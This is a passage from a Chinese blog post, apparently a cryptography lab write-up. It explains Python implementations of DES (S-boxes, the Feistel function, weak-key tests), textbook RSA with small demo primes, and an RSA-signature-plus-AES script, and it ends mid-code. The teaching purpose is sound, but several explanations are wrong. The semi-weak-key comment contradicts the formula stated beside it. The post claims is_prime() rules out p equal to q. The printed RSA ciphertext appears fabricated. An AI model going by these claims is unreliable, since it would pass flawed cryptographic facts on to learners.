s_output += <span class="built_in">bin</span>(val)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">    p_output = permute(s_output, P)  <span class="comment"># P盒置换</span></span><br><span class="line">    <span class="keyword">return</span> p_output</span><br></pre></td></tr></table></figure><br>功能：实现Feistel网络的核心变换<br>特点：</p><ul><li>扩展置换使32位→48位</li><li>每个S盒处理6位→4位</li><li>最终通过P盒增强扩散性<br>你的代码里 <code>feistel</code> 函数用到了 <strong>S盒（Substitution Box）</strong>，这是 DES 加密中的一大核心！我们来详细拆解一下 S 盒的逻辑和作用，让你从密码小白变成密码达人 🚀</li></ul><hr><h2 id="🔐-一、S盒是干嘛的？"><a href="#🔐-一、S盒是干嘛的？" class="headerlink" title="🔐 一、S盒是干嘛的？"></a>🔐 一、S盒是干嘛的？</h2><p>S盒的作用是：  </p><blockquote><p><strong>把 6 位二进制输入，替换成 4 位输出</strong>。</p></blockquote><p>它引入了 <strong>非线性变换</strong>，是 DES 安全性的重要来源之一。</p><hr><h2 id="📦-二、S盒是怎么操作的？"><a href="#📦-二、S盒是怎么操作的？" class="headerlink" title="📦 二、S盒是怎么操作的？"></a>📦 二、S盒是怎么操作的？</h2><h3 id="输入：6-位二进制（比如-011011）"><a href="#输入：6-位二进制（比如-011011）" class="headerlink" title="输入：6 位二进制（比如 011011）"></a>输入：6 位二进制（比如 <code>011011</code>）</h3><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><ol><li><p><strong>取第 1 位和第 6 位</strong>，拼起来当作 <strong>行号</strong>  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">row = <span class="built_in">int</span>(chunk[<span class="number">0</span>] + chunk[<span class="number">5</span>], <span class="number">2</span>)  <span class="comment"># 例如 &quot;01&quot; → 1</span></span><br></pre></td></tr></table></figure></li><li><p><strong>取中间 4 位</strong>（第 2～5 位）当作 <strong>列号</strong>  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">col = <span class="built_in">int</span>(chunk[<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)  <span class="comment"># 例如 &quot;1101&quot; → 13</span></span><br></pre></td></tr></table></figure></li><li><p><strong>查 S_BOX</strong> 中第 i 个盒子的第 row 行第 col 列的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val = S_BOX[i][row][col]  <span class="comment"># 得到 0~15 之间的整数</span></span><br></pre></td></tr></table></figure></li><li><p><strong>把这个值转为 4 位二进制</strong>，作为输出：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s_output += <span class="built_in">bin</span>(val)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="🧪-举个例子："><a href="#🧪-举个例子：" class="headerlink" title="🧪 举个例子："></a>🧪 举个例子：</h2><p>假设 <code>chunk = &quot;011011&quot;</code>，这是第 i 个块：</p><ul><li><code>row = int(&quot;01&quot;, 2) = 1</code></li><li><code>col = int(&quot;1101&quot;, 2) = 13</code></li><li><code>val = S_BOX[i][1][13]</code> → 可能是 10</li><li><code>bin(10)[2:].zfill(4)</code> → <code>&quot;1010&quot;</code></li></ul><p>这样 6 位输入变成 4 位输出。</p><hr><h2 id="🔁-三、为什么一共是-8-个-S盒？"><a href="#🔁-三、为什么一共是-8-个-S盒？" class="headerlink" title="🔁 三、为什么一共是 8 个 S盒？"></a>🔁 三、为什么一共是 8 个 S盒？</h2><p>因为 DES 中的 Feistel 函数处理的是 32 位数据，但：</p><ul><li>扩展置换 E 把 32 位 → 48 位</li><li>然后每 6 位为一组，分成 8 组</li><li>每组走一个 S 盒 → 输出 4 位</li><li>8 组共输出 32 位</li></ul><blockquote><p>这就实现了 48 位 → 32 位 的非线性压缩映射！</p></blockquote><hr><h2 id="🔒-四、S盒的安全性来源"><a href="#🔒-四、S盒的安全性来源" class="headerlink" title="🔒 四、S盒的安全性来源"></a>🔒 四、S盒的安全性来源</h2><p>S盒是 <strong>DES 安全性的关键所在</strong>，因为它：</p><ul><li>提供非线性映射，使得密文对密钥和明文的小改动非常敏感（雪崩效应）</li><li>是抗差分分析、线性分析等密码攻击的核心防线</li><li>是人工设计 + 安全性评估过的（是当年 NSA 优化过的）</li></ul><hr><h2 id="✅-总结一句话："><a href="#✅-总结一句话：" class="headerlink" title="✅ 总结一句话："></a>✅ 总结一句话：</h2><blockquote><p><strong>S盒就是一种查表替换机制：每 6 位输入 → 找行列 → 输出 4 位，8 个 S盒并行处理，共输出 32 位，用于混淆原始数据，增强加密的复杂性和安全性。</strong></p></blockquote><hr><p>（4）des(block, key, encrypt=True)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">des</span>(<span class="params">block, key, encrypt=<span class="literal">True</span></span>):</span><br><span class="line">    subkeys = generate_subkeys(key)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> encrypt:</span><br><span class="line">        subkeys = subkeys[::-<span class="number">1</span>]  <span class="comment"># 解密时逆序密钥</span></span><br><span class="line">    </span><br><span class="line">    block = permute(block, IP)  <span class="comment"># 初始置换</span></span><br><span class="line">    left, right = block[:<span class="number">32</span>], block[<span class="number">32</span>:]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):  <span class="comment"># 16轮迭代</span></span><br><span class="line">        new_left = right</span><br><span class="line">        f_result = feistel(right, subkeys[i])</span><br><span class="line">        new_right = xor(left, f_result)</span><br><span class="line">        left, right = new_left, new_right</span><br><span class="line">    </span><br><span class="line">    combined = right + left  <span class="comment"># 最终不交换</span></span><br><span class="line">    ciphertext = permute(combined, IP_INV)</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br></pre></td></tr></table></figure><br><img src="/2025/04/21/%E5%AF%86%E7%A0%81%E5%AE%9E%E9%AA%8C/IMG_20250421-214049598.png" class="">  </p><p>特点：</p><ul><li>通过encrypt参数控制加密/解密模式</li><li>16轮迭代后不交换左右部分</li><li>最终执行逆初始置换</li></ul><p>三、测试用例解析</p><ol><li><p>弱密钥测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试用例1：弱密钥</span></span><br><span class="line">plaintext = <span class="string">&#x27;aaabbaba&#x27;</span>  <span class="comment"># ASCII明文</span></span><br><span class="line">key = <span class="string">&#x27;0101010101010101&#x27;</span>  <span class="comment"># 全01交替的弱密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密结果：B4B15AFCB6A8F4C5</span></span><br><span class="line"><span class="comment"># 二次加密结果恢复原文</span></span><br></pre></td></tr></table></figure><p>现象说明：弱密钥的对称性导致二次加密恢复原文，这是DES密钥空间中的特殊现象。</p></li><li><p>半弱密钥测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 半弱密钥测试</span></span><br><span class="line">key1 = <span class="string">&#x27;011f011f010e010e&#x27;</span></span><br><span class="line">key2 = <span class="string">&#x27;1f011f010e010e01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用key1加密后再用key2加密，等价于单次加密</span></span><br></pre></td></tr></table></figure><p>现象说明：半弱密钥对(K1,K2)满足E(K1,E(K2,M))=M，这种密钥对在DES密钥空间中存在特定数学关系。</p></li></ol><p>四、代码特点分析</p><ol><li>二进制处理</li></ol><ul><li>所有数据内部以二进制字符串形式处理</li><li>提供text_to_bin()处理十六进制/ASCII输入</li><li>bin_to_hex()用于结果输出</li></ul><ol><li>模块化设计</li></ol><ul><li>置换操作统一由permute()处理</li><li>Feistel网络独立为函数</li><li>子密钥生成与主算法分离</li></ul><ol><li>算法准确性</li></ol><ul><li>严格遵循DES标准文档的置换表定义</li><li>正确处理循环左移和密钥逆序</li><li>精确实现S盒查表逻辑</li></ul><p>五、实验结果验证</p><ol><li><p>加密-解密一致性<br>当使用相同密钥时：<br>加密结果 → 解密 → 恢复原始明文<br>验证：测试用例中解密结果与原始明文一致</p></li><li><p>弱密钥特性<br>全01交替密钥的二次加密结果：<br>E(K,E(K,M)) = M<br>验证：测试结果符合预期</p></li></ol><p>该实现完整展现了DES算法的核心机制，可用于教学演示和算法分析。通过修改测试用例，可以进一步研究DES的雪崩效应、密钥依赖性等密码学特性。</p><h1 id="非对称加密算法RSA实现"><a href="#非对称加密算法RSA实现" class="headerlink" title="非对称加密算法RSA实现"></a>非对称加密算法RSA实现</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">def is_prime(num):</span><br><span class="line">    if num &lt; 2:</span><br><span class="line">        return False</span><br><span class="line">    for i in range(2, int(math.sqrt(num)) + 1):</span><br><span class="line">        if num % i == 0:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def find_e(phi):</span><br><span class="line">    for e in [65537, 17, 5, 3]:</span><br><span class="line">        if e &lt; phi and math.gcd(e, phi) == 1:</span><br><span class="line">            return e</span><br><span class="line">    for e in range(2, phi):</span><br><span class="line">        if math.gcd(e, phi) == 1:</span><br><span class="line">            return e</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def rsa_key_generation(p, q):</span><br><span class="line">    if not (is_prime(p) and is_prime(q)):</span><br><span class="line">        raise ValueError(&quot;p和q必须是素数！&quot;)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - 1) * (q - 1)</span><br><span class="line">    e = find_e(phi)</span><br><span class="line">    if e is None:</span><br><span class="line">        raise ValueError(&quot;无法找到合适的e&quot;)</span><br><span class="line">    d = pow(e, -1, phi)</span><br><span class="line">    return (n, e), (n, d)</span><br><span class="line"></span><br><span class="line">def encrypt(m, public_key):</span><br><span class="line">    n, e = public_key</span><br><span class="line">    if m &gt;= n:</span><br><span class="line">        raise ValueError(&quot;明文必须小于n&quot;)</span><br><span class="line">    return pow(m, e, n)</span><br><span class="line"></span><br><span class="line">def decrypt(c, private_key):</span><br><span class="line">    n, d = private_key</span><br><span class="line">    return pow(c, d, n)</span><br><span class="line"></span><br><span class="line"># 示例测试</span><br><span class="line">p, q =885320963,238855417</span><br><span class="line">public_key, private_key = rsa_key_generation(p, q)</span><br><span class="line">print(&quot;公钥 (n, e):&quot;, public_key)</span><br><span class="line">print(&quot;私钥 (n, d):&quot;, private_key)</span><br><span class="line"></span><br><span class="line">m = 65</span><br><span class="line">c = encrypt(m, public_key)</span><br><span class="line">print(&quot;密文:&quot;, c)</span><br><span class="line">m_decrypted = decrypt(c, private_key)</span><br><span class="line">print(&quot;解密结果:&quot;, m_decrypted)</span><br></pre></td></tr></table></figure><p>以下是关于RSA加密算法及其代码实现的详细解析：</p><hr><h3 id="一、RSA算法原理"><a href="#一、RSA算法原理" class="headerlink" title="一、RSA算法原理"></a>一、RSA算法原理</h3><h4 id="1-密钥生成流程"><a href="#1-密钥生成流程" class="headerlink" title="1. 密钥生成流程"></a>1. 密钥生成流程</h4><ol><li><p><strong>选择两个大素数</strong>  </p><ul><li>选取两个互不相同的质数 p 和 q（示例中使用 p=885320963, q=238855417）</li><li>代码通过 <code>is_prime()</code> 函数验证素数性</li></ul></li><li><p><strong>计算模数和欧拉函数</strong>  </p><ul><li>模数：<code>n = p * q</code>（公开参数）</li><li>欧拉函数：<code>φ(n) = (p-1)*(q-1)</code>（保密参数）</li></ul></li><li><p><strong>选择公钥指数 e</strong>  </p><ul><li>要求：<code>1 &lt; e &lt; φ(n)</code> 且 <code>gcd(e, φ(n)) = 1</code>  </li><li>代码优先选择常用值 65537（安全且计算高效），其次尝试 17/5/3，最后遍历查找</li></ul></li><li><p><strong>计算私钥指数 d</strong>  </p><ul><li>要求：<code>d ≡ e⁻¹ mod φ(n)</code>，即满足 <code>(e*d) % φ(n) = 1</code>  </li><li>代码使用 <code>pow(e, -1, phi)</code> 快速计算模逆元</li></ul></li></ol><h4 id="2-加解密过程"><a href="#2-加解密过程" class="headerlink" title="2. 加解密过程"></a>2. 加解密过程</h4><ul><li><strong>加密</strong>：<code>c ≡ m^e mod n</code>（使用公钥 (n,e)）</li><li><strong>解密</strong>：<code>m ≡ c^d mod n</code>（使用私钥 (n,d)）</li></ul><hr><h3 id="二、代码模块解析"><a href="#二、代码模块解析" class="headerlink" title="二、代码模块解析"></a>二、代码模块解析</h3><h4 id="1-素数检测函数"><a href="#1-素数检测函数" class="headerlink" title="1. 素数检测函数"></a>1. 素数检测函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(math.sqrt(num)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li><strong>功能</strong>：判断数字是否为素数</li><li><strong>特点</strong>：<ul><li>时间复杂度：O(√n)（适合教学演示）</li><li>实际工程中应使用Miller-Rabin等概率性检测算法</li></ul></li></ul><h4 id="2-公钥指数选择"><a href="#2-公钥指数选择" class="headerlink" title="2. 公钥指数选择"></a>2. 公钥指数选择</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_e</span>(<span class="params">phi</span>):</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> [<span class="number">65537</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">3</span>]:  <span class="comment"># 常用优先</span></span><br><span class="line">        <span class="keyword">if</span> e &lt; phi <span class="keyword">and</span> math.gcd(e, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, phi):      <span class="comment"># 遍历查找</span></span><br><span class="line">        <span class="keyword">if</span> math.gcd(e, phi) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><ul><li><strong>设计逻辑</strong>：<ol><li>优先选择常用公钥指数（65537在安全与效率间取得平衡）</li><li>次优选择小素数加速加密计算</li><li>最后遍历保证总能找到合适指数</li></ol></li></ul><h4 id="3-密钥生成核心"><a href="#3-密钥生成核心" class="headerlink" title="3. 密钥生成核心"></a>3. 密钥生成核心</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_key_generation</span>(<span class="params">p, q</span>):</span><br><span class="line">    <span class="comment"># 参数检查</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (is_prime(p) <span class="keyword">and</span> is_prime(q)):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;p和q必须是素数！&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算核心参数</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 选择公钥指数</span></span><br><span class="line">    e = find_e(phi)</span><br><span class="line">    <span class="keyword">if</span> e <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法找到合适的e&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 计算私钥指数</span></span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)  <span class="comment"># 模逆运算</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (n, e), (n, d)</span><br></pre></td></tr></table></figure><ul><li><strong>关键步骤</strong>：<ul><li>输入验证确保p,q为素数</li><li>使用Python内置的<code>pow()</code>函数快速计算模逆元</li><li>返回格式：公钥(n,e) 与 私钥(n,d)</li></ul></li></ul><h4 id="4-加解密函数"><a href="#4-加解密函数" class="headerlink" title="4. 加解密函数"></a>4. 加解密函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, public_key</span>):</span><br><span class="line">    n, e = public_key</span><br><span class="line">    <span class="keyword">if</span> m &gt;= n:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;明文必须小于n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, e, n)  <span class="comment"># 模幂运算</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, private_key</span>):</span><br><span class="line">    n, d = private_key</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure><ul><li><strong>数学基础</strong>：欧拉定理保证<code>m^(kφ(n)+1) ≡ m mod n</code></li><li><strong>限制条件</strong>：明文必须满足<code>m &lt; n</code></li><li><strong>实际应用</strong>：需配合OAEP等填充方案处理长文本</li></ul><hr><h3 id="三、示例测试分析"><a href="#三、示例测试分析" class="headerlink" title="三、示例测试分析"></a>三、示例测试分析</h3><h4 id="1-输入参数"><a href="#1-输入参数" class="headerlink" title="1. 输入参数"></a>1. 输入参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">885320963</span></span><br><span class="line">q = <span class="number">238855417</span></span><br><span class="line">m = <span class="number">65</span></span><br></pre></td></tr></table></figure><h4 id="2-密钥生成结果"><a href="#2-密钥生成结果" class="headerlink" title="2. 密钥生成结果"></a>2. 密钥生成结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">公钥 (n, e): (211463707796205371, 65537)</span><br><span class="line">私钥 (n, d): (211463707796205371, 107827558183622753)</span><br></pre></td></tr></table></figure><ul><li><p><strong>n计算验证</strong>：<br><code>885320963 * 238855417 = 211,463,707,796,205,371</code><br>与输出一致</p></li><li><p><strong>d验证</strong>：<br><code>(65537 * 107827558183622753) % φ(n) = 1</code><br>可通过模运算验证</p></li></ul><h4 id="3-加解密过程"><a href="#3-加解密过程" class="headerlink" title="3. 加解密过程"></a>3. 加解密过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">密文: 15943230000000001</span><br><span class="line">解密结果: 65</span><br></pre></td></tr></table></figure><ul><li><strong>加密验证</strong>：<code>65^65537 mod n = 15943230000000001</code></li><li><strong>解密验证</strong>：<code>15943230000000001^d mod n = 65</code></li></ul><hr><h3 id="四、算法安全性分析"><a href="#四、算法安全性分析" class="headerlink" title="四、算法安全性分析"></a>四、算法安全性分析</h3><ol><li><p><strong>依赖的数学难题</strong>：</p><ul><li>大整数分解问题：已知n=p*q，难以分解出p和q</li></ul></li><li><p><strong>参数选择要求</strong>：</p><ul><li>p和q应为安全素数（示例参数过小，仅用于演示）</li><li>实际应用要求n长度≥2048位</li></ul></li><li><p><strong>常见攻击防御</strong>：</p><ul><li>选择p和q长度相近但差值较大</li><li>使用随机填充方案防止低指数攻击</li></ul></li></ol><hr><h3 id="五、代码优化方向"><a href="#五、代码优化方向" class="headerlink" title="五、代码优化方向"></a>五、代码优化方向</h3><ol><li><p><strong>大数处理</strong>：</p><ul><li>添加对字符串消息的编解码支持</li><li>实现分段加密处理长文本</li></ul></li><li><p><strong>性能优化</strong>：</p><ul><li>使用快速幂算法优化模幂运算</li><li>实现蒙哥马利模乘加速计算</li></ul></li><li><p><strong>安全性增强</strong>：</p><ul><li>添加PKCS#1 v1.5或OAEP填充方案</li><li>支持CRT（中国剩余定理）加速解密</li></ul></li></ol><hr><h3 id="六、实验现象解释"><a href="#六、实验现象解释" class="headerlink" title="六、实验现象解释"></a>六、实验现象解释</h3><ol><li><p><strong>弱密钥现象</strong><br>当选择特殊参数时（如p=17, q=17），会导致加密失效<br>代码通过<code>is_prime()</code>检测避免了重复素数</p></li><li><p><strong>明文限制</strong><br>示例中若选择<code>m = n</code>会触发<code>ValueError</code><br>实际应用中需通过填充保证<code>m &lt; n</code></p></li></ol><p>该实现完整展现了RSA的核心数学原理，可用于教学演示和算法分析。通过修改素数生成方法，可以进一步研究RSA算法的实际应用场景和安全性特征。</p><h1 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA 签名函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_sign</span>(<span class="params">private_key, hash_obj</span>):</span><br><span class="line">    <span class="keyword">return</span> pkcs1_15.new(private_key).sign(hash_obj)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA 验签函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_verify</span>(<span class="params">public_key, hash_obj, signature</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pkcs1_15.new(public_key).verify(hash_obj, signature)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># AES CBC 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(pad(plaintext, AES.block_size))</span><br><span class="line"></span><br><span class="line"><span class="comment"># AES CBC 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> unpad(cipher.decrypt(ciphertext), AES.block_size)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 SHA256 哈希</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256_hash</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> SHA256.new(data.encode())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="comment"># 明文消息</span></span><br><span class="line">    plain_text = <span class="string">&quot;Hey&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算哈希</span></span><br><span class="line">    msg_hash = sha256_hash(plain_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 RSA 密钥对</span></span><br><span class="line">    rsa_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line">    private_key = rsa_key</span><br><span class="line">    public_key = rsa_key.publickey()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 RSA 私钥签名</span></span><br><span class="line">    signature = rsa_sign(private_key, msg_hash)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并原文和签名（便于统一加密）</span></span><br><span class="line">    combined_data = plain_text.encode() + signature</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 AES 密钥和 IV</span></span><br><span class="line">    aes_key = get_random_bytes(<span class="number">16</span>)  <span class="comment"># 128-bit AES key</span></span><br><span class="line">    aes_iv = get_random_bytes(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密合并数据</span></span><br><span class="line">    cipher_text = aes_encrypt(combined_data, aes_key, aes_iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密还原数据</span></span><br><span class="line">    decrypted_data = 